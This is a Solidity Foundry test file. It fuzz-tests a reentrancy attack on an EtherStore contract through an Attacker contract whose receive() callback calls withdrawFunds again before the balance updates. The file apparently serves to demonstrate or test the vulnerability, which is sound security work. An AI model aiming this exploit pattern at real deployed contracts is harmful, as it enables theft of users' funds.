
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {

    EtherStore public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.01 ether && attackVal <= 1 ether / 2);
        vm.assume(attackVal < type(uint128).max / 2);

        vm.warp(604801);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 4);

        _attacker.setupAttack{value: attackVal * 2}(attackVal * 2);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = EtherStore(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.depositFunds{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.withdrawFunds(val);

        if (attackCallCount > 1 && address(this).balance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.withdrawFunds(storedAttackVal);
            attackCallCount++;
        }
    }
}
